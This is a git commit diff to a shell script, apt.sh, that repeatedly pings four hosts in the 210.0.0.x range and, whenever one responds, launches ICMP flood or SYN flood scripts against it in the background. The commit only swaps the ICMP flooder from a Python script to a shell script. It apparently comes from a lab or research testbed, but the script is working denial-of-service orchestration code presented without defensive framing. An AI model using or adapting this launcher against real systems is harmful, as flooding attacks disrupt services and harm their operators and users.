29d49a5f86a284e1a17c2385062807327b70b970
root <root@einstein-gw2.us-east1-b.c.phdandpeasant2.internal>
2019-09-20 04:10:15 +0000

    god

--- apt.sh
+++ apt.sh
@@ -2,12 +2,12 @@ while true; do
 	if (( ping 210.0.0.101 -c 1 | grep -q 'from'))
 	then
 			echo "Bhost 1 found - ICMP attack"
-			python icmp/icmp-flooder_simple.py 210.0.0.101 & 
+			sh icmp/flooder_simple.sh 210.0.0.101 & 
 	fi
 	if (( ping 210.0.0.102 -c 1 | grep -q 'from'))
 	then
 			echo "Bhost 2 found - ICMP attack"
-			python icmp/icmp-flooder_simple.py 210.0.0.102 &
+			sh icmp/flooder_simple.sh 210.0.0.102 &
 	fi
 
 	if (( ping 210.0.0.103 -c 1 | grep -q 'from'))
@@ -20,5 +20,4 @@ while true; do
 			echo "Bhost 4 found - SYN attack"
 			sh syn-flood/flooder_simple.sh 210.0.0.104 1234 &
 	fi
-
 done
